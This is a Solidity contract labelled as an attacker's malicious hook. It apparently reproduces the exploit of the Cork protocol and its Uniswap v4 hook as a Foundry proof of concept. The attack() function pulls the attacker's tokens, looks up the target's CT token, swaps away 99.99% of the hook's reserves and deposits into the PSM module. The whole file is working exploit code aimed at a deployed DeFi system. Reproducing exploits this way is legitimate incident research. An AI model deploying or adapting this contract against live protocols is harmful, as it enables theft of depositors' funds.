// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Interfaces.sol";
import "forge-std/console.sol";

// Attacker's Malicious Hook
contract CorkMaliciousHook {
    ICorkHook corkHook;
    IPSMProxy moduleCore;
    IPSMProxy assetFactory;

    IERC20 lpToken;
    IERC20 wstETH;
    IERC20 weETH8CT;
    IERC20 etherfiWETH;
    ICorkConfig corkConfig;
    IUniV4PoolManager uniV4PoolManager;

    address exchangeRateProvider;

    address internal attacker_EOA;

    bytes32 internal constant PAIR_ID_FOR_RATE =
        0x6b1d373ba0974d7e308529a62e41cec8bac6d71a57a1ba1b5c5bf82f6a9ea07a;

    constructor(
        ICorkHook _corkHook,
        IPSMProxy _moduleCore,
        IPSMProxy _assetFactory,
        IERC20 _lpToken,
        IERC20 _wstETH,
        IERC20 _weETH8CT,
        IERC20 _etherfiWETH,
        ICorkConfig _corkConfig,
        IUniV4PoolManager _uniV4PoolManager,
        address _exchangeRateProvider
    ) {
        corkHook = _corkHook;
        moduleCore = _moduleCore;
        assetFactory = _assetFactory;
        lpToken = _lpToken;
        wstETH = _wstETH;
        weETH8CT = _weETH8CT;
        etherfiWETH = _etherfiWETH;
        corkConfig = _corkConfig;
        uniV4PoolManager = _uniV4PoolManager;

        exchangeRateProvider = _exchangeRateProvider;

        attacker_EOA = msg.sender;
    }

    function attack() external {
        require(msg.sender == attacker_EOA, "not attacker_EOA");

        // 3.1 Pulls LP and wstETH tokens from EOA
        lpToken.transferFrom(attacker_EOA, address(moduleCore), lpToken.balanceOf(attacker_EOA)); // to proxy
        wstETH.transferFrom(attacker_EOA, address(this), wstETH.balanceOf(attacker_EOA)); // to self

        // 3.2 Makes two calls to getDeployedSwapAssets to identify the ct
        (address[] memory cts, /* address[] memory ds */ ) = assetFactory.getDeployedSwapAssets(
            address(wstETH),
            address(etherfiWETH),
            493_150_684_700_000_000, // TODO: why?
            7_776_001, // TODO: why?
            exchangeRateProvider,
            0,
            7
        );

        //  debug assertion for this reproduction, not strictly needed.
        require(address(weETH8CT) == cts[1], "retrieved ct does not match");

        // 3.3 Retrieves reserves of Cork
        address _weETH8CT = cts[1];
        (, uint256 _reserves) = corkHook.getReserves(address(wstETH), _weETH8CT); // weETH8CT

        // 4.4 Performs the swap
        uint256 amtToSwap = _reserves * 9999 / 10_000;
        wstETH.approve(address(corkHook), type(uint256).max);
        IERC20(_weETH8CT).approve(address(corkHook), type(uint256).max);

        corkHook.swap(address(wstETH), _weETH8CT, 0, amtToSwap, "");

        // 4.5 Resets approvals
        wstETH.approve(address(corkHook), 0);
        IERC20(_weETH8CT).approve(address(corkHook), 0);

        // 4.6 Deposits wstETH to Module Core
        wstETH.approve(address(moduleCore), type(uint256).max);
        moduleCore.depositPsm(PAIR_ID_FOR_RATE, 4_000_000_000_000_000);

        // 4.5 Resets approvals
        wstETH.approve(address(moduleCore), 0);
    }
}
